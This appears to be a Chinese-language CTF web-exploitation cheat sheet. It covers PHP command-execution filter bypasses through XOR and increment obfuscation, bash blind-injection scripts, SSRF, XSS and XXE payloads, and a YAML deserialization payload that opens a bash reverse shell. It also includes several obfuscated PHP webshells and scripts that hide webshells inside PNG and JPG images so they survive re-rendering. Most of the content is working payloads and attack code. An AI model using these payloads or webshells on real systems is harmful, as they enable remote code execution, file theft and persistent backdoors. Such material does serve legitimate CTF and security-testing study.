$_=('%40'^'%21').('%7B'^'%08').('%7B'^'%08').('%7B'^'%1E').('%7E'^'%0C').('%7C'^'%08');  // $_=assert
$_1='_'.('%3C'^'%7B').('%3E'^'%7B').('%0B'^'%5F');//$_1=_GET
$_2=$$_1; #$_2=$_GET
$_($_2[6]);  //assert($_GET[6])
之后通过?6=...来传参
```

  

```python
# 异或构造Python脚本
valid = "1234567890!@$%^*(){}[];\'\",.<>/?-=_`~ "
 
answer = input('输入异或构造的字符串:')
 
tmp1, tmp2 = '', ''
for c in answer:
    for i in valid:
        for j in valid:
            if ord(i) ^ ord(j) == ord(c):
                tmp1 += i
                tmp2 += j
                break
        else:
            continue
        break
 
print(f'"{tmp1}"^"{tmp2}"')

("%0c%06%0c%0b%05%0d"^"%7f%7f%7f%7f%60%60")("%0c%0c"^"%60%7f");	//system(ls);
("%0c%19%0c%5c%60%60"^"%7f%60%7f%28%05%0d")("%0e%0c%00%00"^"%60%60%20%2a");

$哈="`{{{"^"?<>/";${$哈}[哼](${$哈}[嗯]);&哼=system&嗯=tac f*
"`{{{"^"?<>/"; 异或出来的结果是 _GET
```
```python
# -*- coding: utf-8 -*-

"""
    @Author disda
    @Date 2023/5/16 10:23
    @Describe
    @Dependency
    @Version 1.0
"""
# -*- coding: utf-8 -*-

"""
    @Author disda
    @Date 2023/4/26 18:56
    @Describe
    @Dependency
    @Version 1.0
"""
import re
import urllib
from urllib import parse

op_dict = {
    "yes_op": lambda x: x,
    "not_op": lambda x: not x,
    "or_op": lambda x, y: x | y,
    "xor_op": lambda x, y: x ^ y
}

sign = {
    'xor_op': '^',
    'or_op':'|'
}

def generate_coding(file_name, pattern, is_match, mode):
    """
    生成符合要求的编码
    @param file_name: 生成文件的名称
    @param pattern: 正则表达式
    @param is_match: 是否匹配正则，True表示匹配，False表示不匹配
    @param mode: 编码方式
    @return:
    """
    with open(file_name, 'w') as f:
        for i in range(256):
            for j in range(256):
                op = op_dict['not_op'] if is_match else op_dict['yes_op']

                # 如果当前外层循环元素被过滤了，直接跳过所有内层循环
                if op(re.search(pattern, chr(i))):
                    break
                # 如果当前内层循环元素被过滤了，跳过该元素
                if op(re.search(pattern, chr(j))):
                    continue

                # [2:]是因为python中hex表示是0xff这样的形式，去掉前面的0x，组成2位url编码
                hex_i = "0" + hex(i)[2:] if i < 16 else hex(i)[2:]
                hex_j = "0" + hex(j)[2:] if j < 16 else hex(j)[2:]
                # url编码的方式和ASCII码一样，但需要在前面加上%
                url_i = '%' + hex_i
                url_j = '%' + hex_j
                # c是我们要构造的参数，比如说我们要传ls命令，l就要拆分成a|b，其中|是因为题目没有过滤|，我们可以修改成其他任意操作如^
                c = op_dict[mode](ord(urllib.parse.unquote(url_i)), ord(urllib.parse.unquote(url_j)))
                # 如果c是可见的字符
                if c >= 32 and c <= 126:
                    f.write(chr(c) + " " + url_i + " " + url_j + '\n')

def action(arg,file_name,mode):
    s1 = ""
    s2 = ""
    for i in arg:
        f = open(file_name, "r")
        while True:
            t = f.readline()
            if t == "":
                break
            if t[0] == i:
                s1 += t[2:5]
                s2 += t[6:9]
                break
        f.close()
    output = "(\"" + s1 + "\""+sign[mode]+"\"" + s2 + "\")"
    return (output)

file_name = 'rce.txt'
mode = 'xor_op'
reg = '^\W+$'
generate_coding(file_name,reg,True,mode)
while True:
    param = action(input("\n[+] your function："),file_name,mode) + action(input("[+] your command："),file_name,mode) + ";"
    print(param)
```
```php
//异或php脚本
 
<?php
$a='phpinfo';
for ($i = 0;$i <strlen($a);$i++)
    echo '%'.dechex(ord($a[$i])^0xff);
echo "^";
for ($j=0;$j<strlen($a);$j++)
    echo '%ff';
?>

(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%93%8c^%ff%ff);	//(system)(ls);
(%fa%fa%fa%fa%fa%fa^%89%83%89%8e%9f%97)(%9c%9e%8b%df%99%d5^%ff%ff%ff%ff%ff%ff);	//(system)(cat f*);

//eval($mess);
//mess=$_="0302181"^"@[@[_^^";	//phpinfo
//$_();		//phpinfo();
```

### 自增绕过

  

```php
//自增payload，eval(@_POST[_]);	,命令传入_
 
$_=[];$_=@"$_";$_=$_['!'=='@'];$___=$_;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$___.=$__;$____='_';$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$__=$_;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$____.=$__;$_=$$____;$___($_[_]);

urlencode=
%24_%3D%5B%5D%3B%24_%3D%40%22%24_%22%3B%24_%3D%24_%5B'!'%3D%3D'%40'%5D%3B%24___%3D%24_%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24___.%3D%24__%3B%24____%3D'_'%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24__%3D%24_%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24__%2B%2B%3B%24____.%3D%24__%3B%24_%3D%24%24____%3B%24___(%24_%5B_%5D)%3B

----------------------------------------------------------------
//长度118:
//$_=[]._;$__=$_[1];$_=$_[0];$_++;$_1=++$_;$_++;$_++;$_++;$_++;$_=$_1.++$_.$__;$_=_.$_(71).$_(69).$_(84);$$_[1]($$_[2]);

$_=[]._;  //Array_
$__=$_[1];  //r
$_=$_[0];   //A
$_++;      //B
$_1=++$_; //C
$_++;     //D
$_++;     //E
$_++;     //F
$_++;     //G
$_=$_1.++$_.$__;    echo $_;  //$_1 CHr
$_=_.$_(71).$_(69).$_(84);    //_GET
$$_[1]($$_[2]);		//$_GET[1]($_GET[2]);

urlencode=%24_%3D%5B%5D._%3B%24__%3D%24_%5B1%5D%3B%24_%3D%24_%5B0%5D%3B%24_%2B%2B%3B%24_1%3D%2B%2B%24_%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%2B%2B%3B%24_%3D%24_1.%2B%2B%24_.%24__%3B%24_%3D_.%24_(71).%24_(69).%24_(84)%3B%24%24_%5B1%5D(%24%24_%5B2%5D)%3B
```

### 回溯绕过

```php
//php正则的回溯次数大于1000000次时返回False
$a = 'hello world'+'h'*1000000
preg_match("/hello.*world/is",$a) == False
```
```python
import requests
url = 'http://1.14.71.254:28288/'
payload = '{"cmd":"?><?=`sort /f*`?>","+":"' + "-" * 1000000 + '"}'
res = requests.post(url=url, data={"letter": payload})
print(res.text)
```

### 正则表达式修饰符

i 不区分(ignore)大小写；m多(more)行匹配，若有换行符则以换行符分割，按行匹配

```php
if(preg_match('/^php$/im', $a)){
    if(preg_match('/^php$/i', $a)){
payload:%0aphp,第一行匹配换行后有php故通过，第二个不符合php开头php结尾故不通过
```

### Bash盲注

[Shell字符串截取 - harara - 博客园](https://www.cnblogs.com/kiko2014551511/p/11531558.html)

```python

import requests
url = "http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/"
result = ""
for i in range(1,5):
    for j in range(1,15):
        #ascii码表
        for k in range(32,128):
            k=chr(k)
            payload = "?c=" + f"if [ `ls / | awk NR=={i} | cut -c {j}` == {k} ];then sleep 2;fi"
            try:
                requests.get(url=url+payload, timeout=(1.5,1.5))
            except:
                result = result + k
                print(result)
                break
    result += " "

---------------------------------------------------------------------------
import requests
url = "http://1bb8ea48-6413-47ef-94bb-8dd313c14c9e.chall.ctf.show:8080/"
result = ""
for j in range(1,60):
    #ascii码表
    for k in range(32,128):
        k=chr(k)
        payload = "?c=" + f"if [ `cat /f149_15_h3r3 | cut -c {j}` == {k} ];then sleep 2;fi"
        try:
            requests.get(url=url+payload, timeout=(1.5,1.5))
        except:
            result = result + k
            print(result)
            break
result += " "

```

### 反弹Shell

[Online - Reverse Shell Generator](https://www.revshells.com/)

---

## SSRF

[SSRF漏洞原理攻击与防御(超详细总结)](https://blog.csdn.net/qq_43378996/article/details/124050308?ops_request_misc=%7B%22request%5Fid%22%3A%22170316079216800197086687%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170316079216800197086687&biz_id=0&spm=1018.2226.3001.4187)

产生SSRF漏洞的函数:

  

**file\_get\_contents**  
**fsockopen**  
**curl\_exec //curl存在ssrf，可以使用file://协议读取文件内容**  
**fopen**  
**readfile**

  

经常利用的一些协议:

  

http://：探测内网主机存活、端口开放情况  
gopher://：发送GET或POST请求；攻击内网应用，如FastCGI、Redis  
dict://：泄露安装软件版本信息，查看端口，操作内网redis访问等  
file://：读取本地文件

  

Bypass的一些方式：

  

> 1.  短网址绕过，短网址生成器。
> 2.  进制转换，如127.0.0.1转十进制2130706433
> 3.  @绕过，如http://www.xxx.com[@127.0.0.1](/127.0.0.1 )
> 4.  DNS重绑定，[https://lock.cmpxchg8b.com/rebinder.html](https:_lock.cmpxchg8b.com_rebinder)
> 5.  302跳转，访问sudo.cc，自动重定向到127.0.0.1

  

[[网鼎杯 2018]Fakebook（ssrf漏洞）](https://blog.csdn.net/qq_44657899/article/details/104884553?ops_request_misc=&request_id=&biz_id=102&spm=1018.2226.3001.4187)

  

```php
//利用load_file()函数
payload1:
/view.php?no=0 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:5:"admin";s:3:"age";i:19;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'
payload2:
/view.php?no=0 union/**/select 1,load_file('/var/www/html/flag.php'),3,4
```

  

```php
//利用fsockopen()函数
fsockopen能够使用socket与服务器进行tcp连接，并传输数据，host、port和数据都能定义，存在SSRF

exp：
  <?php
  $out = "GET /flag.php HTTP/1.1\r\n";
  $out .= "Host: 127.0.0.1\r\n";
  $out .= "Connection: Close\r\n\r\n";
  echo base64_encode($out);
  ?>
    将这一段信息通过fwrite写进我们的会话中，这些就是请求头

payload:?host=127.0.0.1&port=80&data=R0VUIC9mbGFnLnBocCBIVFRQLzEuMQ0KSG9zdDogMTI3LjAuMC4xDQpDb25uZWN0aW9uOiBDbG9zZQ0KDQo=
```

### @隔断

```php
$challenge = $_POST['challenge'];
if (strpos($challenge, 'http://jasmineaura.github.io') !== 0)
{
    die('这不是 Aura 的博客！');
}

$blog_content = file_get_contents($challenge);
if (strpos($blog_content, '已经收到Kengwang的礼物啦') === false)
{
    die('请去博客里面写下感想哦~');
} 
在文件上传的web靶机上传1.txt,包含内容“已经收到Kengwang的礼物啦”
challenge=http://jasmineaura.github.io\@challenge.basectf.fun:47202/uploads/1.txt
challenge=http://jasmineaura.github.io@challenge.basectf.fun:47202/uploads/1.txt
```

### Redis

Redis，key-value高速缓存库，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步，可以随时将数据写回到硬盘中，常可以通过SSRF打redis进行getshell操作。

## XSS

  

```javascript
<script>
  function fetchData() {
    var xhr = new XMLHttpRequest();
    xhr.open('GET', '/flag', true);

    xhr.onload = function() {
      if (xhr.status === 200) {
        var data = xhr.responseText;
        var xhrPost = new XMLHttpRequest();
        xhrPost.open('POST', '/content/652d5ab41cfdb2c789ea26567c409261', true);
        xhrPost.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
        xhrPost.send('content=' + encodeURIComponent(data));
      }
    };

    xhr.onerror = function() {
      console.error('error:', xhr.statusText);
    };

    xhr.send();
  }

fetchData();
</script>
```

## XXE

XML 外部实体注入

```xml
XML声明：<?xml version="1.0" encoding="utf-8" ?>
内部DTD声明：<!DOCTYPE 根元素名称 [元素声明]>
在DTD中定义属性：<!ATTLIST 元素名 (属性名 属性类型 缺省值)*>
外部实体声明：<!ELEMENT 实体名称 SYSTEM “URI/URL”>

```
```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///flag">
  ]>
<user><username>&admin;</username><password>123</password></user>
```
```shell
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
  <!ELEMENT foo ANY >
  <!ENTITY xxe SYSTEM "file:///etc/passwd" >
]>
<foo>&xxe;</foo>
```

## yaml反序列化

yaml.full\_load()函数

分析流中的所有YAML文档  
并生成相应的Python对象。

```yaml
!!python/object/new:str
args: []
state: !!python/tuple
- "__import__('os').system('bash -c \"bash -i >& /dev/tcp/ip/port <&1\"')"
- !!python/object/new:staticmethod
args: []
state:
update: !!python/name:eval
items: !!python/name:list
```
```bash
nc -lvvp 9000
```

这里full\_load调用了load函数，而load函数输入的是一个steam,也就是流，二进

制文件，所以不管是什么后缀都无关紧要了。.txt也能被当作.yaml来解析

---

## 文件上传

```php
<!DOCTYPE html>
<html>
<head>
    <title>File Upload Form</title>
</head>
<body>
<h1>File Upload Form</h1>
<form action="http://node6.anna.nssctf.cn:28431/" enctype="multipart/form-data" method="post" >
    <label for="file">Select a file:</label>
    <input type="file" name="file" id="file">
    <br>
    <input type="submit" value="Upload File">
</form>
</body>
</html>
```
```python
import requests

url = 'http://node5.anna.nssctf.cn:28916/'
file_content = "<?php phpinfo();?>"
filename = 'a.php%2f%2e'
file = {'file': (filename, file_content)}
response = requests.post(url, files=file)
print(response.text)
```

[总结](https://blog.csdn.net/weixin_44576725/article/details/121476423?ops_request_misc=%7B%22request%5Fid%22%3A%22170235387716800188553856%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=170235387716800188553856&biz_id=0&spm=1018.2226.3001.4187)

### 过滤

```php
Content-Type: image/png jpeg
              image/gif
         zip: application/x-zip-compressed
bmp文件  BM
gif文件  GIF
文件后缀大小写
使用空格进行截断后缀
. 绕过
pht, phpt, phtml, php3,php4,php5,php6

GIF89a
<script language="php">eval($_POST["shell"]);</script>
<?php @eval($_POST[shell]); ?>
GIF<?=`nl /*`; #cat /*

#[]过滤
<?=@eval($_POST{"shell"})?>

#;过滤
##短标签
<?=@eval($_POST{"shell"})?>
<?=system('cat f*')?>

#()过滤
<?=`tac ../f*`?>

#``、php过滤
<?=include"ph"."p://filter/convert.base64-encode/resource=../flag.p"."hp"?>
<?=include"/var/lo"."g/nginx/access.l"."og"?>

#getimagesize()检测
GIF89a

#.过滤
session包含
.user.ini:
GIF89a
auto_prepend_file=/tmp/sess_0

#<>过滤
日志包含
.user.ini:
auto_prepend_file=/var/log/nginx/access.log

#免杀
<?php 
    $poc="s#y#s#t#e#m"; 
    $poc_1=explode("#",$poc); 
    $poc_2=$poc_1[0].$poc_1[1].$poc_1[2].$poc_1[3].$poc_1[4].$poc_1[5];
    $poc_2($_REQUEST['1']);
?>
-------------------------------------
<?php $bFIY=create_function(chr(25380/705).chr(92115/801).base64_decode('bw==').base64_decode('bQ==').base64_decode('ZQ=='),chr(0x16964/0x394).chr(0x6f16/0xf1).base64_decode('YQ==').base64_decode('bA==').chr(060340/01154).chr(01041-0775).base64_decode('cw==').str_rot13('b').chr(01504-01327).base64_decode('ZQ==').chr(057176/01116).chr(0xe3b4/0x3dc));$bFIY(base64_decode('NjgxO'.'Tc7QG'.'V2QWw'.'oJF9Q'.''.str_rot13('G').str_rot13('1').str_rot13('A').base64_decode('VQ==').str_rot13('J').''.''.chr(0x304-0x2d3).base64_decode('Ug==').chr(13197/249).str_rot13('F').base64_decode('MQ==').''.'B1bnR'.'VXSk7'.'MjA0N'.'TkxOw'.'=='.''));?>
//密码TyKPuntU
--------------------------------------
<?php
$a=substr('1s',1).'ystem';
$a($_REQUEST[1]);
?>
--------------------------------------
<?php
$a=strrev('metsys');
$a($_REQUEST[1]);
?>
--------------------------------------
<?php
$a=$_REQUEST['a'];
$b=$_REQUEST['b'];
$a($b);
?>
```

#### 限制图片宽高

```php
$img_info[0]<=20 && $img_info[1]<=20（image hight and width must less than 20）
在文件开头自定义：
#define height 1
#define width 1
```

#### PNG图片二次渲染

```php
<?php

/*<?$_GET[0]($_POST[1]);?>*/

$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
    0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
    0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
    0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
    0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
    0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
    0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
    0x66, 0x44, 0x50, 0x33);

$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
    $r = $p[$y];
    $g = $p[$y+1];
    $b = $p[$y+2];
    $color = imagecolorallocate($img, $r, $g, $b);
    imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'1.png');
```

#### JPG图片二次渲染

```php
<?php
	/*

	The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
	It is necessary that the size and quality of the initial image are the same as those of the processed image.

	1) Upload an arbitrary image via secured files upload script
	2) Save the processed image and launch:
	jpg_payload.php <jpg_name.jpg>

	In case of successful injection you will get a specially crafted image, which should be uploaded again.

	Since the most straightforward injection method is used, the following problems can occur:
	1) After the second processing the injected data may become partially corrupted.
	2) The jpg_payload.php script outputs "Something's wrong".
	If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

	Sergey Bobrov @Black2Fan.

	See also:
	https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

	*/

	$miniPayload = '<?=eval($_POST[1]);?>';

	if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
    	die('php-gd is not installed');
	}
	
	if(!isset($argv[1])) {
		die('php jpg_payload.php <jpg_name.jpg>');
	}

	set_error_handler("custom_error_handler");

	for($pad = 0; $pad < 1024; $pad++) {
		$nullbytePayloadSize = $pad;
		$dis = new DataInputStream($argv[1]);
		$outStream = file_get_contents($argv[1]);
		$extraBytes = 0;
		$correctImage = TRUE;

		if($dis->readShort() != 0xFFD8) {
			die('Incorrect SOI marker');
		}

		while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
			$marker = $dis->readByte();
			$size = $dis->readShort() - 2;
			$dis->skip($size);
			if($marker === 0xDA) {
				$startPos = $dis->seek();
				$outStreamTmp = 
					substr($outStream, 0, $startPos) . 
					$miniPayload . 
					str_repeat("\0",$nullbytePayloadSize) . 
					substr($outStream, $startPos);
				checkImage('_'.$argv[1], $outStreamTmp, TRUE);
				if($extraBytes !== 0) {
					while((!$dis->eof())) {
						if($dis->readByte() === 0xFF) {
							if($dis->readByte !== 0x00) {
								break;
							}
						}
					}
					$stopPos = $dis->seek() - 2;
					$imageStreamSize = $stopPos - $startPos;
					$outStream = 
						substr($outStream, 0, $startPos) . 
						$miniPayload . 
						substr(
							str_repeat("\0",$nullbytePayloadSize).
								substr($outStream, $startPos, $imageStreamSize),
							0,
							$nullbytePayloadSize+$imageStreamSize-$extraBytes) . 
								substr($outStream, $stopPos);
				} elseif($correctImage) {
					$outStream = $outStreamTmp;
				} else {
					break;
				}
				if(checkImage('payload_'.$argv[1], $outStream)) {
					die('Success!');
				} else {
					break;
				}
			}
		}
	}
	unlink('payload_'.$argv[1]);
	die('Something\'s wrong');

	function checkImage($filename, $data, $unlink = FALSE) {
		global $correctImage;
		file_put_contents($filename, $data);
		$correctImage = TRUE;
		imagecreatefromjpeg($filename);
		if($unlink)
			unlink($filename);
		return $correctImage;
	}

	function custom_error_handler($errno, $errstr, $errfile, $errline) {
		global $extraBytes, $correctImage;
		$correctImage = FALSE;
		if(preg_match('/(\d+) extraneous bytes before marker/', $errstr, $m)) {
			if(isset($m[1])) {
				$extraBytes = (int)$m[1];
			}
		}
	}

	class DataInputStream {
		private $binData;
		private $order;
		private $size;

		public function __construct($filename, $order = false, $fromString = false) {
			$this->binData = '';
			$this->order = $order;
			if(!$fromString) {
				if(!file_exists($filename) || !is_file($filename))
					die('File not exists ['.$filename.']');
				$this->binData = file_get_contents($filename);
			} else {
				$this->binData = $filename;
			}
			$this->size = strlen($this->binData);
		}

		public function seek() {
			return ($this->size - strlen($this->binData));
		}

		public function skip($skip) {
			$this->binData = substr($this->binData, $skip);
		}

		public function readByte() {
			if($this->eof()) {
				die('End Of File');
			}
			$byte = substr($this->binData, 0, 1);
			$this->binData = substr($this->binData, 1);
			return ord($byte);
		}

		public function readShort() {
			if(strlen($this->binData) < 2) {
				die('End Of File');
			}
			$short = substr($this->binData, 0, 2);
			$this->binData = substr($this->binData, 2);
			if($this->order) {
				$short = (ord($short[1]) << 8) + ord($short[0]);
			} else {
				$short = (ord($short[0]) << 8) + ord($short[1]);
			}
			return $short;
		}

		public function eof() {
			return !$this->binData||(strlen($this->binData) === 0);
		}
	}
?>

```

成功率较高的图：

  

[jpg1.jpg](https://www.yuque.com/attachments/yuque/0/2024/jpeg/39170111/1716347080427-9a795cff-5516-43ec-8ecd-e167a506e7fc.jpeg)

用法：

先在网页上传这张图片

然后点击查看图片，crtl+s下载被渲染过的图片，另存为1.jpg

放在脚本同目录下，然后运行脚本`php 脚本.php 1.jpg`，生成payload\_1.jpg

然后再上传payload\_1.jpg，点击查看图片，可以看到图片有明显变化

然后抓包，执行命令获取flag

  

[1.jpg](https://www.yuque.com/attachments/yuque/0/2024/jpeg/39170111/1716347053634-f07ab4eb-f07c-4dad-83fe-b142bd02bbb7.jpeg)

用法：

放在脚本同目录下，跑脚本

#### pathinfo($filename, PATHINFO\_EXTENSION)

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1714203324368-01112cb6-49ff-4a11-b536-f4635c2684b0.png)

文件名为xxx.xxx/.时，pathinfo函数的PATHINFO\_EXTENSION只能得到空  
(/.用url编码%2f%2e)

#### file\_put\_contents

![](https://cdn.nlark.com/yuque/0/2024/png/39170111/1714203396995-a875a340-c36d-4286-baa3-cb7d1848cc69.png)

xxx.xxx/.这种文件名在被file\_put\_contents函数处理时，会解析成xxx.xxx  
(/.用url编码%2f%2e)

### `os.path.join()`函数（py）

  

绝对路径拼接漏洞

  

os.path.join(path,\*paths)函数用于将多个文件路径连接成一个组合的路径。第一个函数通常包含了基础路径，而之后的每个参数被当作组件拼接到基础路径之后。

然而，这个函数有一个少有人知的特性，如果拼接的某个路径以 **/** 开头，那么包括基础路径在内的所有前缀路径都将被删除，该路径将视为绝对路径

  

### Apache解析漏洞

`shell.php.txt`

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1741079546277-c799579d-ba4e-4052-bfae-8820f7962486.png)

### .htaccess

提示的httpd，想到是利用htaccess文件

[.htaccess 详解](https:_www.cnblogs.com_adforce_archive_2012_11_23_2784664)

更改Apache里的.htaccess的配置。可以将其它类型的文件转化为PHP的文件类型。

(改content-type绕检测)

```html
<FilesMatch "1.png">
SetHandler application/x-httpd-php
</FilesMatch>
-----------------------------------------
AddType application/x-httpd-php .jpg
```

  

### .user.ini

`.user.ini`。它比`.htaccess`用的更广，不管是**nginx/apache/IIS**，只要是以**fastcgi**运行的php都可以用这个方法。

[.user.ini文件构成的PHP后门 - phith0n](https:_wooyun.js.org_drops_user.ini%e6%96%87%e4%bb%b6%e6%9e%84%e6%88%90%e7%9a%84php%e5%90%8e%e9%97%a8)

前提是含有.user.ini的文件夹下**需要有正常的php文件**，蚁剑文件路径访问文件夹目录

多刷新几次

```properties
GIF89a
auto_prepend_file=1.png		#指定一个文件，自动包含在要执行的文件(.php)前，类似于在文件前调用了require()函数
#auto_append_file类似，只是在文件后面包含
```

  

### phar伪协议

phar伪协议可以是PHP的一个解压缩包的函数，不管后缀，都会当做压缩包来解压，由于Phar内容清单中存储内容的形式是序列化的，当文件中有file\_get\_content()，file\_exists()等函数的参数可控时候，使用phar://伪协议，会直接进行反序列化的操作将文件内容还原，即使不用unserialize()反序列化函数也能进行反序列化的操作，就有可能导致反序列化的漏洞。

[Phar与Stream Wrapper造成PHP RCE的深入挖掘 - 先知社区 (aliyun.com)](https://xz.aliyun.com/t/2958#toc-0)

```php
<?php
    $payload = '<?php eval($_POST["shell"]); ?>'; //一句话木马
    $phar = new Phar("example.phar"); //后缀名必须为phar
    $phar->startBuffering();
    $phar->setStub("<?php __HALT_COMPILER(); ?>"); //设置stub
    $phar->addFromString("67.php", "$payload"); //添加要压缩的文件
    // $phar->setMetadata(...); //在metadata添加序列化字符串，可参考 phar反序列化
    $phar->stopBuffering();//签名自动计算,默认是SHA1
?>
```

  

用法：?file=phar://压缩包/内部文件 phar://xxx.png/shell.php

注意 PHP>=5.3.0压缩包需要是zip协议压缩，rar不行，将木马文件压缩后，改为其他任意格式的文件都可以正常使用。

步骤：写一个一句话木马shell.php，然后用zip协议解压缩为shell.zip。然后将后缀改为png等其他格式

  

[文件上传与Phar反序列化的摩擦_[nssround#4 swpu\]1zweb(revenge)-CSDN博客](https://blog.csdn.net/weixin_53090346/article/details/127676088)

修改了反序列的数量后，绕过了\_\_wakeup()方法，但是修改之后，签名确保完整性就不对了，所以还要重新进行签名

```python
from hashlib import sha1

file = open('phar.phar', 'rb').read()

data = file[:-28]#要签名的部分是文件头到metadata的数据？

final = file[-8:]

newfile = data+sha1(data).digest()+final

open('newpoc.phar', 'wb').write(newfile)
```

得到phar文件后gzip压缩

```bash
gzip newpoc.phar
```

> ## Phar压缩文件
> 
> 一般phar由四个部分组成：1、存根，2、描述内容的清单，3、文件内容，4、完整性签名
> 
> 1、Stub：即Phar文件的文件头，默认是<?php xxxx \_\_HALT\_COMPILER(); ?>，xxx可以是自定义的任何字符，不定义默认就为<?php \_\_HALT\_COMPILER(); ?>
> 
> 2、a manifest describing the contents：phar包的各种属性信息，包括文件名、压缩文件的大小，序列化的文件、大小等等
> 
